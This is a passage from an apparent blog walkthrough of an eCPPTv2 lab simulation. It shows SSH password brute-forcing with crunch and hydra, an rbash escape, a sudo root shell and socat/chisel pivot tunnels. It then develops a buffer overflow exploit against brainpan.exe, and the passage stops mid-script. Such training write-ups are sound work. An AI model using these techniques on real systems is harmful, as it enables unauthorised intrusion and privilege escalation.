-&lt;]&gt;- ----- ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++
+[-&gt;- --&lt;]&gt; ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++.-- .---- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+
+++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
]&gt;+.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--. &lt;++++ ++++[
-&gt;+++ +++++ &lt;]&gt;++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; .&lt;+++
[-&gt;++ +&lt;]&gt;+ ++++. +.&lt;++ +++++ +[-&gt;- ----- --&lt;]&gt; ----- ---.&lt; +++[- &gt;---&lt;
]&gt;--- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++
+[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----
-.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -----
-.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. .++++ .---- ----. +++.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+
+++++ ++[-&gt; ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++
.&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++
+++.. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]
&gt;++.&lt; +++++ [-&gt;-- ---&lt;] &gt;-..&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.-
--.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ +++++ +.+++
++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----. &lt;++++ +[-&gt;-
----&lt; ]&gt;-.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ ++++. &lt;++++ +[-&gt;+ ++++&lt; ]&gt;+++ +++++
+.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.+ .&lt;+++ +[-&gt;- ---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +..&lt;+
++[-&gt; +++&lt;] &gt;++++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- --.&lt;+ ++[-&gt;
---&lt;] &gt;---. &lt;++++ ++[-&gt; +++++ +&lt;]&gt;+ ++++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----.
&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ ++++. +++++ ++++. +++.&lt; +++[- &gt;---&lt; ]&gt;--.
--.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- -.&lt;++ +++++
+[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;--.&lt; ++++[ -&gt;+++ +&lt;]&gt;+
+.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
+.+++ .---- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++
+++[- &gt;++++ ++++&lt; ]&gt;+++ .++++ +.--- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +.&lt;++ ++[-&gt;
----&lt; ]&gt;-.+ +.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- ---.&lt; +++[- &gt;+++&lt;
]&gt;+++ +.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt;
]&gt;++. ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++ +[-&gt;+
+++++ &lt;]&gt;++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
]&gt;+++ +++++ .---- ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; -.&lt;++
+++++ +[-&gt;- ----- --&lt;]&gt; ----- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;+.&lt;+ ++[-&gt;
---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +.--- -.&lt;++ +[-&gt;- --&lt;]&gt; --.++ .++.- .&lt;+++
+++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++
[-&gt;-- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt;
----- ---&lt;] &gt;---- ----. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++++ +++.. &lt;++++ +++[-
&gt;---- ---&lt;] &gt;---- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ ++.-- .++++ +++.&lt;
+++++ ++++[ -&gt;--- ----- -&lt;]&gt;- ----- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
+++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -.+++ +++.- --.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-.
&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ .++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]
&gt;--.+ +++++ ++.&lt;+ +++++ ++[-&gt; ----- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt;
+++++ +++&lt;] &gt;+.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ +++++ [-&gt;--
----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++ +++.&lt; +++[-
&gt;---&lt; ]&gt;-.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt;
+++.&lt; +++[- &gt;+++&lt; ]&gt;+++ .+++. .&lt;+++ [-&gt;-- -&lt;]&gt;- ---.- -.&lt;++ ++[-&gt; ++++&lt;
]&gt;+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
.+.-- .---- ----- .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----
.&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++ ++++. ----- ----. &lt;++++ ++++[
-&gt;--- ----- &lt;]&gt;-- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ ++++.
&lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..+ +++.- ----- --.++ +.&lt;++
+[-&gt;- --&lt;]&gt; ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt;
----- ---.- --.&lt;

</code></pre></div></div>

<p>This is a programming language called <strong>Brainfuck</strong> we can try to decode this intruction using ** Brainfuck decoder online **.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/Brainfuck-decoder.png" alt="" /></p>

<p>When we decode it we can get to read this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You can enter into matrix as guest, with password k1ll0rXX

Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.

</code></pre></div></div>

<p>If we remember that when we performed the scan on the Matrix machine port 22 was open, then we can try to connect via ssh with the user <strong>guest</strong> and the password we can try to crack it with <strong>hydra</strong>, to do this we can do the following:</p>

<p>Create a dictionari:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 8 8 -t k1ll0r@% &gt;&gt; passwd.txt

Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
❯ crunch 8 8 -t k1ll0r%@ &gt;&gt; passwd.txt

Crunch will now generate the following amount of data: 2340 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260 
</code></pre></div></div>

<p>This command will generate a passwd.txt file containing all possible password combinations of length 8 following the pattern k1ll0r@%, where % will be replaced by all allowed special characters. So we run the command again but changing the sponsor from <strong>%@</strong> so that we have more possibilities in the dictionary. Now we can execute <strong>hydra</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> proxychains hydra -l guest -P passwd.txt ssh://192.168.100.133 -t 20 2&gt; /dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 15:55:26
</code></pre></div></div>

<p>The valid passwd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "k1ll0r7n"
</code></pre></div></div>

<p>Once we have the credentials we can try to connect to the Matrix machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roxychains ssh guest@192.168.100.133
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:6757-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:9999-&lt;&gt;-127.0.0.1:8888-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:9999-&lt;&gt;-127.0.0.1:1080-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:9999-&lt;&gt;&lt;&gt;-192.168.100.133:22-&lt;&gt;&lt;&gt;-OK

guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
guest@porteus:~$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
guest@porteus:~$ 

</code></pre></div></div>

<p>When we are inside the machine we can see that it is using <strong>rbash</strong>.</p>

<p>rbash is a restricted version of the Unix Bash shell (Bourne Again SHell). In rbash (or “Restricted Bash”), some functions and features of the standard shell are disabled to limit usercapabilities, thus improving security in certain environments where it is necessary to restrict user actions.</p>

<p>But there is a bypass to get around this, we need to put <strong>bash</strong> at the end of the command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> proxychains ssh guest@192.168.100.133 bash
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:6757-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:9999-&lt;&gt;-127.0.0.1:8888-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:9999-&lt;&gt;-127.0.0.1:1080-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:9999-&lt;&gt;&lt;&gt;-192.168.100.133:22-&lt;&gt;&lt;&gt;-OK
whoami
guest
echo $SHELL
/bin/rbash
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Videos
prog

</code></pre></div></div>

<p>Now we have to do the stty treatment, as we taught previously.</p>

<h2 id="got-root-3">Got Root</h2>

<p>On this machine this step has been very simple, we can execute the following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guest@porteus:~$ sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
guest@porteus:~$ 
</code></pre></div></div>

<p>We can see that we have permissions to be able to run anything, using the password for the user <strong>guest</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guest@porteus:~$ sudo bash
Password: 
root@porteus:/home/guest# whoami
root
root@porteus:/home/guest# 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@porteus:~# cd /root/

root@porteus:~# ls
Desktop/    Downloads/  Pictures/  Videos/  flag.txt          ip.sh
Documents/  Music/      Public/    

root@porteus:~# cat flag.txt 
   _,-.                                                             
,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
|`-._`-.\,-'_|  _,-'.                                               
     `-.|.-' | |`.-'|_     WHAT                                     
        |      |_|,-'_`.                                            
              |-._,-'  |     NO, ME NEITHER                         
         jrei | |    _,'                                            
              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    

root@porteus:~# 

</code></pre></div></div>

<h1 id="brainpain">BrainPain</h1>

<p>Finally we are on the last machine, before we start hacking the machine we need to export our ssh public key on the Matrix machines to have persistence and export the socat and chisel tools for the tunnels.</p>

<p>With the other tunnels we need to create another tunnel to see the Brainpan machine, as follow:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aragog:~# ./socat TCP-LISTEN:6667,fork TCP:192.168.1.21:1234

root@Nagini:~# ./socat TCP-LISTEN:5455,fork TCP:10.10.0.128:6667

root@Fawkes:~# ./socat TCP-LISTEN:4444,fork TCP:192.168.100.130:5455

root@porteus:~# ./chisel client 192.168.100.128:4444 R:6767:socks
2024/09/04 20:26:39 client: Connecting to ws://192.168.100.128:4444
2024/09/04 20:26:39 client: Connected (Latency 1.636264ms)
</code></pre></div></div>

<p>Remember to add <strong>127.0.0.1 6767</strong> in <strong>/etc/proxychains.conf</strong>. Once this is done we have visibility with the brainpan machine.</p>

<h2 id="scanreport-4">ScanReport</h2>

<p>We scanned and found this</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -n -v 172.18.0.132 2&gt;&amp;1 | grep "tcp open"
9999/tcp open  abyss
10000/tcp open  snet-sensor-mgmt
</code></pre></div></div>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/website-brainpan.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nc 172.18.0.132 9999
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:6767-&lt;&gt;-127.0.0.1:9999-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:6767-&lt;&gt;-127.0.0.1:8888-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:6767-&lt;&gt;-127.0.0.1:1080-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:6767-&lt;&gt;&lt;&gt;-172.18.0.132:9999-&lt;&gt;&lt;&gt;-OK
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          &gt;&gt; 

</code></pre></div></div>

<p>On the web we found nothing but on port 9999 there is an internal program running, the following set we think is website fuzz to find more hidden directories. But if you try to fuzz you will know that it is impossible because of <strong>timeout</strong>, so we will use BurpSuite.</p>

<p>To do so, we must follow these steps:</p>

<p>We need to make Burpsuite use socks proxy type:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/burpsuite-setting.png" alt="" /></p>

<p>Now we have to reload the web page we are going to fuzz while we have the burpsuite intercepting the traffic, it is important to have the proxy in the browser for it to work:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/website-intercept.png" alt="" /></p>

<p>We have now intercepted the traffic with Burpsuite:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/trawfic-intercepted.png" alt="" /></p>

<p>Now we have to send it to intruder to prepare our payload, for this we have to do <strong>Ctrl+I</strong>:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/intruder.png" alt="" /></p>

<p>When the request is intercepted without adding anything, we can add <strong>test</strong> after the slash, and select it and hit <strong>add</strong>:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/add.png" alt="" /></p>

<p>Now we have to go inside payloads and select <strong>Load</strong> to load the dictionary that we are going to use to perform the attack:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/load.png" alt="" /></p>

<p>Finally we can start the attack:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/attack.png" alt="" /></p>

<p>We can distinguish the valid directories according to the status code, finally we find the <strong>bin</strong> directory:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/bin.png" alt="" /></p>

<p>When we enter the <strong>bin</strong> directory, it offers us to download an .exe, probably the program that is running on the Brainpan machine on port 9999:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/download.png" alt="" /></p>

<p>As it is an .exe we are going to use <strong>Immunty Debuger</strong> on a windows 7 x86 machine, to see if this program is vulnerable to a possible Buffer OverFlow.</p>

<h2 id="buffer-over-flow">Buffer Over Flow</h2>

<p>When we have installed the <strong>Immunity Debugger</strong> we have to run it in administrator mode and also run the Brainpan.exe and do the following:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/attach.png" alt="" /></p>

<p>This is used to synchronize the Immunity Debugger with the program in order to debug it.</p>

<p>Now we have to check if for some reason the developer of this program has not sanitized the user input properly. So we have to connect from our attacker machine to the windows 7 machine we are using to debug the program. It is important that when we synchronize the program with the Immunity debugger on the windows 7 machine to hit start because it is already paused.
<img src="/assets/images/2024-08-17-eCPPTv2-simulation/paused.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sending set of **A** to see program feedback:

nc 192.168.1.16 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

</code></pre></div></div>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/sobreEscritura.png" alt="" /></p>

<p>In the Immunity we can see that the program has been paused and that the EIP value is <strong>A</strong> and the ESP is the same, so what has just happened is that we have written more <strong>A</strong> than expected and we have exceeded the size of the allocated buffer and therefore we are overwriting certain registers that exist in memory, the goal now is to find out the <strong>offset</strong>.</p>

<p>To do so, we are going to create a pattern of one thousand characters with <strong>metasploit</strong> and we will send them:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

</code></pre></div></div>

<p>It is important whenever the program crashes to restart the program and the Immunity Debugger.</p>

<p>When we send the string of 1000 characters we will see a value in the EIP, we have to copy this value to know the offset.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/offset.png" alt="" /></p>

<p>When we have the copied value, we have to do the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
[*] Exact match at offset 524
</code></pre></div></div>

<p>Now that we know that we need 524 <strong>A</strong> before overwriting the EIP, we can do the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 -c 'print("A"*524+"B"*4+"C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

nc 192.168.1.16 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

</code></pre></div></div>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/eip-control.png" alt="" /></p>

<p>Now we see that we have control of the eip, also we can see that the ESP points to the beginning of the <strong>C</strong> this is important because now if we make the flow of the program point to an address we can find an address that points to the beginning of the <strong>C</strong>. Now we have to keep in mind that not all characters can be interpreted by the program, so we have to know what they are. This is important because when creating the shellcode we have to know which are the bad characters so as not to use it because otherwise it won’t work.</p>

<p>For this we will use mona.py, which you can find on github. To go faster you can copy the raw and put it in a .py file and do the following:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/mona.png" alt="" /></p>

<p>You must put the mona.py file in the path shown in the image. Now we have to configure a working directory with mona to be able to create our bytearray that will help us to know which are the bad characters:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/workingFolder.png" alt="" /></p>

<p>Now we can create the bytearray that will be saved in the directory:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/workingFolder.png" alt="" /></p>

<p>Now we can create the bytearray but without the “\x00” because this is always a bad character:</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/bytenull.png" alt="" /></p>

<p>Next we have to transfer the bytearray to our attacking machine. We can do this very simply using <strong>impacket-smbserver</strong>. When we have it passed we have to send it to the program in the following way:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = b"B"*4 # JMP ESP

after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
